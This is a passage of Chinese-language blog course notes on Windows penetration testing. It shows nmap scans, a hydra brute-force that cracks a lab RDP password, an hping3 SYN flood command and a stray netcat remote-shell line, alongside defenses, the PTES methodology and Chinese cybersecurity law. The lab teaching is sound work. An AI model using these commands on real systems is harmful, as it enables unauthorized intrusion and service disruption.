class="attr">OS</span> <span class="string">CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span></span><br><span class="line"><span class="attr">OS</span> <span class="string">details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span></span><br><span class="line"><span class="attr">Network</span> <span class="string">Distance: 1 hop</span></span><br><span class="line"></span><br><span class="line"><span class="attr">OS</span> <span class="string">detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">done: 1 IP address (1 host up) scanned in 2.74 seconds</span></span><br></pre></td></tr></table></figure><h3 id="检测软件版本"><a href="#检测软件版本" class="headerlink" title="检测软件版本"></a>检测软件版本</h3><p><strong>探测目标主机运行的软件及版本</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">nmap -sV 192.168.10.142                        //扫描目标的软件版本（-sV）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">PORT</span>      <span class="string">STATE SERVICE      VERSION</span></span><br><span class="line"><span class="attr">21/tcp</span>    <span class="string">open  ftp          Microsoft ftpd</span></span><br><span class="line"><span class="attr">23/tcp</span>    <span class="string">open  telnet       Microsoft Windows XP telnetd</span></span><br><span class="line"><span class="attr">25/tcp</span>    <span class="string">open  smtp         Microsoft ESMTP 7.5.7601.17514</span></span><br><span class="line"><span class="attr">80/tcp</span>    <span class="string">open  http         Microsoft IIS httpd 7.5</span></span><br><span class="line"><span class="attr">135/tcp</span>   <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">139/tcp</span>   <span class="string">open  netbios-ssn  Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="attr">445/tcp</span>   <span class="string">open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span></span><br><span class="line"><span class="attr">49152/tcp</span> <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">49153/tcp</span> <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">49154/tcp</span> <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">49155/tcp</span> <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">49156/tcp</span> <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">49157/tcp</span> <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">49158/tcp</span> <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">49159/tcp</span> <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">49160/tcp</span> <span class="string">open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:0C:29:01:FA:F0 (VMware)</span></span><br><span class="line"><span class="attr">Service</span> <span class="string">Info: Host: WIN-5MQI51VLCDC; OSs: Windows, Windows XP, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Service</span> <span class="string">detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">done: 1 IP address (1 host up) scanned in 77.74 seconds</span></span><br></pre></td></tr></table></figure><h3 id="指定扫描端口"><a href="#指定扫描端口" class="headerlink" title="指定扫描端口"></a>指定扫描端口</h3><p><strong>检查目标主机是否开放80,3389端口</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">nmap -sS -p 80,3389 192.168.10.142                        //扫描主机的80及3389端口</span></span><br><span class="line"><span class="attr">Starting</span> <span class="string">Nmap 7.92 ( https://nmap.org ) at 2023-12-26 09:54 CST</span></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">scan report for 192.168.10.142</span></span><br><span class="line"><span class="attr">Host</span> <span class="string">is up (0.00049s latency).</span></span><br><span class="line"></span><br><span class="line"><span class="attr">PORT</span>     <span class="string">STATE SERVICE</span></span><br><span class="line"><span class="attr">80/tcp</span>   <span class="string">open  http</span></span><br><span class="line"><span class="attr">3389/tcp</span> <span class="string">open  ms-wbt-server</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:0C:29:01:FA:F0 (VMware)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">done: 1 IP address (1 host up) scanned in 1.31 seconds</span></span><br></pre></td></tr></table></figure><h3 id="指定扫描端口范围"><a href="#指定扫描端口范围" class="headerlink" title="指定扫描端口范围"></a>指定扫描端口范围</h3><p><strong>检查目标主机1-100端口哪些是开放的</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">nmap -sS -p 1-100 192.168.10.142                       //扫描主机的1-100端口中开放的端口</span></span><br><span class="line"><span class="attr">Starting</span> <span class="string">Nmap 7.92 ( https://nmap.org ) at 2023-12-26 09:55 CST</span></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">scan report for 192.168.10.142</span></span><br><span class="line"><span class="attr">Host</span> <span class="string">is up (0.00056s latency).</span></span><br><span class="line"><span class="attr">Not</span> <span class="string">shown: 96 closed tcp ports (reset)</span></span><br><span class="line"><span class="attr">PORT</span>   <span class="string">STATE SERVICE</span></span><br><span class="line"><span class="attr">21/tcp</span> <span class="string">open  ftp</span></span><br><span class="line"><span class="attr">23/tcp</span> <span class="string">open  telnet</span></span><br><span class="line"><span class="attr">25/tcp</span> <span class="string">open  smtp</span></span><br><span class="line"><span class="attr">80/tcp</span> <span class="string">open  http</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:0C:29:01:FA:F0 (VMware)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">done: 1 IP address (1 host up) scanned in 1.30 seconds</span></span><br></pre></td></tr></table></figure><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="什么是暴力破解"><a href="#什么是暴力破解" class="headerlink" title="什么是暴力破解"></a>什么是暴力破解</h3><p><strong>密码破解指攻击者猜解目标密码或用户名的攻击行为</strong></p><p><strong>暴力破解</strong></p><ul><li>也称为“密码穷举”，列出各种可能的密码，用来尝试去访问目标系统</li><li>任何密码都可以用这种方法来破解，不过越复杂的密码破解耗时也越长</li></ul><p><strong>字典破解</strong></p><ul><li>实施破解时采用“可能”的密码，比如生日、单词、常用数字</li><li>可手动或通过工具编写，也可以通过分享获取社工密码库</li></ul><p><strong>Kali自带密码字典: &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;</strong></p><ul><li>全球最常见的密码是“123456“、“password”、“123456789”</li></ul><h3 id="crunch字典工具"><a href="#crunch字典工具" class="headerlink" title="crunch字典工具"></a>crunch字典工具</h3><p><strong>基本用法</strong></p><p><strong>crunch 最小长度 最大长度 素材字符 -o 字典文件</strong></p><ul><li>crunch 6 6 0123456789                       &#x2F;&#x2F;6位纯数字密码</li><li>crunch 6 8 Abc1234                             &#x2F;&#x2F;由Abc1234随机组成的6~8位密码</li></ul><h3 id="hydra暴破工具"><a href="#hydra暴破工具" class="headerlink" title="hydra暴破工具"></a>hydra暴破工具</h3><p><strong>hydra，海德拉，一款功能强大的开源密码攻击工具</strong></p><ul><li>名称来自希腊神话中的九头蛇</li><li>支持多种协议的破解</li><li>SSH、FTP、HTTPS、POP3、IMAP、Http-Proxy、 Telnet、SMB、Cisco、RDPMySQL、MS-SQL等</li></ul><p><strong>基本用法</strong></p><ul><li>hydra -l 用户名 -P 密码字典文件 目标地址 服务类型</li><li>比如：hydra -l Administrator -P pass.txt 192.168.10.142 rdp</li></ul><p><strong>常用选项</strong></p><ul><li>-l 指定用户名</li><li>-L 指定用户名字典文件</li><li>-p 指定密码</li><li>-P 指定密码字典文件</li><li>-o 将结果输出到指定文件</li></ul><h3 id="暴破RDP密码"><a href="#暴破RDP密码" class="headerlink" title="暴破RDP密码"></a>暴破RDP密码</h3><p><strong>实验环境</strong></p><ul><li>kali2022攻击机、win2008靶机（开启RDP远程桌面服务）</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">hydra -l Administrator -P pass.txt -o output.txt 192.168.10.142 rdp            //暴力破解操作</span></span><br><span class="line"><span class="attr">[INFO]</span> <span class="string">Reduced number of tasks to 4 (rdp does not like many parallel connections)</span></span><br><span class="line"><span class="attr">[WARNING]</span> <span class="string">the rdp module is experimental. Please test, report - and if possible, fix.</span></span><br><span class="line"><span class="attr">[DATA]</span> <span class="string">max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task</span></span><br><span class="line"><span class="attr">[DATA]</span> <span class="string">attacking rdp://192.168.10.142:3389/</span></span><br><span class="line"><span class="attr">[3389][rdp]</span> <span class="string">host: 192.168.10.142   login: Administrator   password: Tedu.cn123       //RDP服务的用户名及密码                                                                 </span></span><br><span class="line"><span class="attr">1</span> <span class="string">of 1 target successfully completed, 1 valid password found</span></span><br><span class="line"><span class="attr">Hydra</span> <span class="string">(https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-26 11:58:00</span></span><br></pre></td></tr></table></figure><p><strong>从kali连接3389远程桌面</strong></p><ul><li>rdesktop -u 用户名 目标主机地址</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">rdesktop -u Administator 192.168.10.142</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Core(warning)</span>: <span class="string">Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.</span></span><br><span class="line"><span class="attr">Failed</span> <span class="string">to initialize NLA, do you have correct Kerberos TGT initialized ?</span></span><br><span class="line"><span class="attr">Do</span> <span class="string">you trust this certificate(yes/no)? yes                 //接受证书</span></span><br><span class="line"><span class="attr">Core(warning)</span>: <span class="string">Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.</span></span><br><span class="line"><span class="attr">Connection</span> <span class="string">established using SSL.</span></span><br></pre></td></tr></table></figure><h3 id="防范暴力破解攻击"><a href="#防范暴力破解攻击" class="headerlink" title="防范暴力破解攻击"></a>防范暴力破解攻击</h3><p><strong>使用复杂的密码并定期更换</strong></p><ul><li>长度8位以上</li><li>包含小写字母、大写字母、符号、数字至少其中三种</li><li>不含有用户名</li></ul><p><strong>管理员账号禁用或改名</strong></p><ul><li>Administrator、root</li></ul><p><strong>启用账户锁定阈值</strong></p><ul><li>管理工具-&gt;本地安全策略</li><li>gpupdate &#x2F;force</li></ul><h2 id="DoS与DDoS攻击"><a href="#DoS与DDoS攻击" class="headerlink" title="DoS与DDoS攻击"></a>DoS与DDoS攻击</h2><h3 id="DoS攻击概述"><a href="#DoS攻击概述" class="headerlink" title="DoS攻击概述"></a>DoS攻击概述</h3><p><strong>DoS，拒绝服务 (Denialof Service)</strong></p><ul><li>通过各种手段，最终导致目标系统崩溃、失去响应</li><li>从而使目标系统不能为正常的用户提供资源或对应的功能(拒绝服务)</li></ul><p><strong>常见的DoS攻击方式</strong></p><ul><li>SYN Flood泛洪</li><li>PingFlood泛洪</li><li>UDPFlood泛洪</li></ul><h3 id="DoS攻击演示"><a href="#DoS攻击演示" class="headerlink" title="DoS攻击演示"></a>DoS攻击演示</h3><p><strong>hping3工具</strong></p><ul><li>可向目标主机发送任意TCP&#x2F;IP协议数据包的一款开源的安全工具</li><li>也用于扫描&#x2F;防火墙测试&#x2F;路由追踪&#x2F;协议分析等场景</li></ul><p><strong>常用选项</strong></p><ul><li>-p：指定目标端口</li><li>–syn：设置SYN标记 (-S)</li><li>–flood：泛洪，尽最快发送数据包，不显示回复</li></ul><p><strong>实验环境</strong></p><ul><li>攻击机：kali2022，使用hping3工具</li><li>靶机：win2008，开启3389远程桌面服务</li></ul><p><strong>场景演示</strong></p><ul><li>针对靶机的3389端口发起攻击，使其失去响应</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">hping3--syn --food -p 3389 192.168.10.142 //SYN包泛洪测试</span></span><br><span class="line"><span class="attr">HPING</span> <span class="string">192.168.10.142(eth0 192.168.10.142):S set, 40 headers + 0 data bytes</span></span><br><span class="line"><span class="attr">hping</span> <span class="string">in flood mode, no replies will be shown</span></span><br><span class="line"><span class="attr">//需要停止时，按Ctrl</span> <span class="string">+ C快捷键</span></span><br></pre></td></tr></table></figure><h3 id="DDoS攻击概述"><a href="#DDoS攻击概述" class="headerlink" title="DDoS攻击概述"></a>DDoS攻击概述</h3><p><strong>DDoS，分布式拒绝服务(Distributed Denialof Service)</strong></p><ul><li>典型的流量攻击，攻击方的主机数量呈现规模化</li><li>通常由分布在不同网络、不同位置的成千上万的主机组成攻击方(通常称为botnet僵尸网络)，被同一发起者所控制</li><li>攻击强度更大</li><li>防御的难度也更大</li></ul><h3 id="防御DDoS-DoS攻击"><a href="#防御DDoS-DoS攻击" class="headerlink" title="防御DDoS&#x2F;DoS攻击"></a>防御DDoS&#x2F;DoS攻击</h3><p><strong>提高服务方的交付能力</strong></p><ul><li>减少服务配置的等待时间</li><li>优化单一客户机的并发响应策略</li><li>更换高性能设备</li><li>增加网络带宽</li><li>采用负载均衡架构</li><li>部署CDN内容分发网络</li></ul><p><strong>部署专用软硬件防御产品</strong></p><ul><li>冰盾防火墙</li><li>流量清洗、DDoS高防IP</li><li>IDS入侵防御设备</li><li>抗DDoS专用防火墙设备</li></ul><h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><h3 id="渗透测试概述"><a href="#渗透测试概述" class="headerlink" title="渗透测试概述"></a>渗透测试概述</h3><p><strong>渗透测试是什么</strong></p><ul><li>是一种通过模拟攻击的技术与方法，打破目标系统的安全防御，并获得目标系统控制访问权的安全测试方法</li></ul><p><strong>为什么要进行渗透测试</strong></p><ul><li>新系统可能存在未知的安全风险</li><li>企业安全更需要未雨绸缪，而不是亡羊补牢</li><li>渗透测试后，如果系统未被攻破，证明之前的安全防御是有效的</li><li>渗透测试可以有效的评估系统的安全状态，并给出合理的改进方案</li></ul><p><strong>渗透测试的目的</strong></p><ul><li>模拟侵入系统获取机密信息</li><li>将入侵过程和细节产生报告提供用户</li><li>确定用户系统存在的安全威胁，完善安全防御，降低安全风险</li></ul><h3 id="原则和目标分类"><a href="#原则和目标分类" class="headerlink" title="原则和目标分类"></a>原则和目标分类</h3><p><strong>渗透测试的原则</strong></p><ul><li>应渐进并且逐步深入，尽可能减少对业务的影响</li><li>渗透测试的最大风险：测试过程中对业务产生的影响</li><li>渗透测试的合规性：符合规范和法律要求是渗透测试的必要条件</li></ul><p><strong>渗透测试的目标分类</strong></p><ul><li>针对主机操作系统渗透：Windows、Linux</li><li>x ┌──(root㉿kali)-[~]└─# nc 192.168.10.142 444             &#x2F;&#x2F;使用nc建立连接​C:\Windows\system32&gt;hostname          &#x2F;&#x2F;查看主机名hostnameWIN-5MQI51VLCDCproperties</li><li>针对应用系统渗透：PHP组成的网站</li><li>针对网络设备渗透：防火墙、路由器、交换机···</li></ul><h3 id="3、渗透测试的七个阶段"><a href="#3、渗透测试的七个阶段" class="headerlink" title="3、渗透测试的七个阶段"></a>3、渗透测试的七个阶段</h3><p><strong>PTES：渗透测试执行标准</strong></p><ul><li>定义一次真正的渗透测试过程</li><li>渗透测试过程分为七个阶段，并在每个阶段定义不同的扩展级别，选择哪种级别由被测试客户决定</li></ul><p><img src="/../img/img_artical/net_sec/9.2.1.png" alt="9.2.1"></p><p><strong>第一阶段：事前交互</strong></p><ul><li>明确范围：IP、域名、云平台，起止时间</li><li>明确规则：目标系统介绍、重点保护对象及特性、相关部门接口人？是否允许数据破坏？是否允许阻断业务正常运行？</li><li>确定目标：web应用?人员权限管理漏洞?</li><li>客户书面授权委托同意实施方案是进行渗透测试的必要条件！</li></ul><p><strong>第二阶段：信息收集</strong></p><ul><li>信息收集是渗透攻击的前提</li><li>信息收集工具：Nmap、OpenVAS</li><li>主动扫描：语言的类型、服务器的类型、目录的结构、使用的软件、数据库类型</li><li>开放搜索：人员信息（域名注册人员信息、web应用中网站发帖人的id、管理员姓名）后台管理页面、默认账号</li></ul><p><img src="/../img/img_artical/net_sec/9.2.2.png" alt="9.2.2"></p><p><strong>第三阶段：威胁建模</strong></p><ul><li>根据收集到的信息，识别出目标系统上可能存在的漏洞与弱点</li><li>分析渗透测试过程中可能产生的风险：大量测试数据的处理，影响正常业务开展;服务器发生异常的应急、数据备份和恢复、成本</li><li>测试方书写实施方案初稿并提交审核：在审核完成后，进行书面委托授权书，授权测试方进行渗透测试</li></ul><p><strong>第四阶段：漏洞分析（手动&amp;自动）</strong></p><ul><li>方法<ul><li>1）漏扫：Nessus、Openvas、AppScan</li><li>2）结合漏洞去MSF找利用程序</li></ul></li><li>内容<ul><li>1）系统漏洞：系统没有及时打补丁</li><li>2）Web漏洞：Web服务配置问题、Web应用开发问题</li><li>3）其它服务漏洞：21、22、445、3389</li><li>4）通信安全：明文传输，token在cookie中传送等</li></ul></li></ul><p><strong>第五阶段：渗透攻击阶段</strong></p><ul><li>根据漏洞分析结果，进行精确打击</li><li>绕过检测机制：IDS、IPS、FW、WAF</li><li>绕过防御机制：IPS、防火墙、WAF、杀毒软件</li><li>定制渗透攻击路径：根据薄弱入口，定制渗透工具路径</li><li>代码攻击：XSS(跨站脚本攻击)、CSRF(跨站请求伪造)、SOL注入·</li></ul><p><strong>第六阶段：后渗透攻击阶段</strong></p><ul><li>获取内部信息：基础设施（网络连接、网络拓扑、VPN、路由等）</li><li>进一步渗透：内网入侵，敏感目标</li><li>持续性存在：添加管理账号，长期驻留</li><li>清理痕迹：清理相关日志（访问、操作），上传文件等</li></ul><p><strong>第七阶段：形成报告</strong></p><ul><li>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</li><li>补充介绍：要对漏洞成因，验证过程和带来危害进行分析</li><li>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</li></ul><h3 id="风险规避"><a href="#风险规避" class="headerlink" title="风险规避"></a>风险规避</h3><p><strong>注意事项</strong></p><ul><li>在事前交互阶段，必须取得客户授权</li><li>取得客户授权后，必须向公安部门等监管机构进行报备</li><li>不要进行诸如ddos攻击、删库、删根</li><li>测试之前对重要数据进行备份</li><li>可以对原始系统生成镜像环境，然后对镜像环境进行测试</li><li>明确渗透测试范围</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Windows渗透测试1</title>
      <link href="/posts/winpte1.html"/>
      <url>/posts/winpte1.html</url>
      
        <content type="html"><![CDATA[<h1 id="Windows渗透测试"><a href="#Windows渗透测试" class="headerlink" title="Windows渗透测试"></a>Windows渗透测试</h1><h2 id="网络安全发展趋势"><a href="#网络安全发展趋势" class="headerlink" title="网络安全发展趋势"></a>网络安全发展趋势</h2><h3 id="网络安全概念"><a href="#网络安全概念" class="headerlink" title="网络安全概念"></a>网络安全概念</h3><p><strong>网络安全</strong></p><ul><li>目的：确保网络系统连续&#x2F;可靠&#x2F;正常地运行，网络服务不中断</li><li>措施：保护网络系统的硬件&#x2F;软件及其中的数据不遭受破坏&#x2F;更改&#x2F;泄露</li></ul><p><strong>主要包括两个方面</strong></p><ul><li>网络攻击：指针对计算机信息系统、基础设施、计算机网络或个人计算机设备的任何类型的进攻动作</li><li>网络防御：面对各类网络攻击的检测、处置、记录、溯源、容错等动作</li></ul><h3 id="网络安全的政策高度"><a href="#网络安全的政策高度" class="headerlink" title="网络安全的政策高度"></a>网络安全的政策高度</h3><p><img src="/../img/img_artical/net_sec/9.1.1.png" alt="9.1.1"></p><h3 id="网络安全成为国家重要战略"><a href="#网络安全成为国家重要战略" class="headerlink" title="网络安全成为国家重要战略"></a>网络安全成为国家重要战略</h3><p><strong>树立正确的网络安全观，加强关键信息基础设施网络安全防护，加强网络安全事件应急指挥能力建设</strong></p><p><img src="/../img/img_artical/net_sec/9.1.2.png" alt="9.1.2"></p><h3 id="网络空间成第五空间"><a href="#网络空间成第五空间" class="headerlink" title="网络空间成第五空间"></a>网络空间成第五空间</h3><p><strong>网络空间安全</strong></p><ul><li>成为陆、海、空、天安全以外的第五空间</li></ul><p><strong>安全影响范围：</strong></p><ul><li>人身安全、城市安全、基础设施安全、社会安全、国家安全</li></ul><h3 id="网络安全事件频发"><a href="#网络安全事件频发" class="headerlink" title="网络安全事件频发"></a>网络安全事件频发</h3><p><img src="/../img/img_artical/net_sec/9.1.3.png" alt="9.1.3"></p><h3 id="木马-病毒-恶意程序"><a href="#木马-病毒-恶意程序" class="headerlink" title="木马&#x2F;病毒&#x2F;恶意程序"></a>木马&#x2F;病毒&#x2F;恶意程序</h3><p><strong>木马</strong></p><ul><li>键盘记录</li><li>截图、摄像头</li><li>盗取账号密码</li></ul><p><strong>病毒&#x2F;恶意程序</strong></p><ul><li>破坏数据</li><li>主机崩溃</li><li>勒索</li></ul><h3 id="漏洞利用-暴力破解"><a href="#漏洞利用-暴力破解" class="headerlink" title="漏洞利用&#x2F;暴力破解"></a>漏洞利用&#x2F;暴力破解</h3><p><strong>漏洞利用</strong></p><ul><li>安装非法程序</li><li>执行非法指令</li><li>获取特权</li></ul><p><strong>暴力破解</strong></p><ul><li>Wi-Fi密码</li><li>系统密码</li><li>文件密码</li></ul><h3 id="系统扫描-拒绝服务"><a href="#系统扫描-拒绝服务" class="headerlink" title="系统扫描&#x2F;拒绝服务"></a>系统扫描&#x2F;拒绝服务</h3><p><strong>系统扫描</strong></p><ul><li>系统类型</li><li>软件版本</li><li>开放端口</li><li>漏洞</li></ul><p><strong>拒绝服务</strong></p><ul><li>DoS</li><li>DDos</li></ul><h3 id="网络钓鱼-中间人攻击"><a href="#网络钓鱼-中间人攻击" class="headerlink" title="网络钓鱼&#x2F;中间人攻击"></a>网络钓鱼&#x2F;中间人攻击</h3><p><strong>网络钓鱼</strong></p><ul><li>诱骗用户访问假冒网站</li><li>骗取账号、密码</li></ul><p><strong>中间人攻击（MITM）</strong></p><ul><li>截获密码</li><li>篡改数据</li><li>例如ARP欺骗、浏览器劫持</li></ul><h2 id="安全法律法规"><a href="#安全法律法规" class="headerlink" title="安全法律法规"></a>安全法律法规</h2><h3 id="主要法律框架"><a href="#主要法律框架" class="headerlink" title="主要法律框架"></a>主要法律框架</h3><ul><li>《宪法》中的相关规定</li><li>《刑法》中的相关规定</li><li>《网络安全法》中的相关规定</li><li>《治安管理处罚法》中的相关规定</li><li>《国家安全法》中的相关规定</li><li>《保守国家秘密法》中的相关规定</li><li>其他行政法规和部门规章</li></ul><h3 id="《宪法》中的相关规定"><a href="#《宪法》中的相关规定" class="headerlink" title="《宪法》中的相关规定"></a>《宪法》中的相关规定</h3><p><strong>第二章  公民的基本权利和义务  第40条</strong></p><ul><li>公民的通信自由和通信秘密受法律的保护</li><li>除因国家安全或者追查刑事犯罪的需要，由公安机关或者检察机关依照法律规定的程序对通信进行检查外，任何组织或者个人不得以任何理由侵犯公民的通信自由和通信秘密</li></ul><h3 id="《刑法》中的相关规定"><a href="#《刑法》中的相关规定" class="headerlink" title="《刑法》中的相关规定"></a>《刑法》中的相关规定</h3><p><font color="#ff0000"><strong>第285条: 非法侵入计算机信息系统罪</strong></font></p><ul><li>非法获取计算机信息系统数据、非法控制计算机信息系统罪;提供侵入、非法侵入、非法控制计算机信息系统程序、工具罪</li><li>违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役</li><li>违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机系统中存储、处理或者传输的数据，或者对该计算机系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金;情节特别严重的，处三年以上七年以下有期徒刑，并处罚金</li><li>提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款规定处罚</li></ul><p><font color="#ff0000"><strong>第286条: 破坏计算机信息系统罪</strong></font></p><ul><li>违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役;后果特别严重的，处五年以上有期徒刑</li><li>违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚</li></ul><p><strong>第287条：利用计算机实施犯罪的提示性规定</strong></p><ul><li>利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚</li></ul><h3 id="《网络安全法》因时因势而生"><a href="#《网络安全法》因时因势而生" class="headerlink" title="《网络安全法》因时因势而生"></a>《网络安全法》因时因势而生</h3><ul><li>2014.02，中央网络安全和信息化领导小组成立，网络安全提升到了国家安全的高度</li><li>2015.06，十二届全国人大常委会审议《网络安全法（草案）》</li><li>2016.07，二次审议稿正式在中国人大网公布，并向社会公开征求意见</li><li>2016.11,《中华人民共和国网络安全法》终审通过</li><li>2016.12，《中华人民共和国网络安全法》正式发布</li><li>2017.06.01,《中华人民共和国网络安全法》正式实施</li></ul><h3 id="其他法律法规和部门规章"><a href="#其他法律法规和部门规章" class="headerlink" title="其他法律法规和部门规章"></a>其他法律法规和部门规章</h3><p><strong>《治安管理处罚法》</strong></p><ul><li>第三章违反治安管理的行为和处罚</li><li>第一节扰乱公共秩序的行为和处罚第29条</li></ul><p><strong>《国家安全法》</strong></p><ul><li>第二十五条规定加强网络管理，防范、制止和依法惩治网络攻击、网络入侵、网络窃密、散布违法有害信息等网络违法行为，维护国家网络空间主权、安全和发展利益</li></ul><p><strong>《保守国家秘密法》</strong></p><ul><li>国家秘密受法律保护。一切国家机关、武装力量、政党、社会团体、企业事业单位和公民都有保守国家秘密的义务</li></ul><p><strong>行政法规</strong></p><ul><li>《电信条例》</li><li>《计算机信息网络国际互联网管理暂行规定》</li><li>《计算机信息网络国际联网安全保护管理办法》</li><li>《互联网信息服务管理办法》</li></ul><p><strong>部门规章</strong></p><ul><li>《中国互联网域名管理办法》（原信产部）</li><li>《互联网IP地址备案管理办法》（原信产部）</li><li>《计算机病毒防治管理办法》（公安部）</li><li>《信息安全等级保护管理办法》（公安部）</li></ul><h3 id="网络安全法主要内容"><a href="#网络安全法主要内容" class="headerlink" title="网络安全法主要内容"></a>网络安全法主要内容</h3><p><strong>共七章七十九条</strong></p><ul><li>第一章 总则</li><li>第二章网络安全支持与促进</li><li>第三章网络运行安全<ul><li>第一节一般规定</li><li>第二节关键信息基础设施的运行安全</li></ul></li><li>第四章网络信息安全</li><li>第五章监测预警与应急处置</li><li>第六章法律责任</li><li>第七章附则</li></ul><h3 id="等级保护制度"><a href="#等级保护制度" class="headerlink" 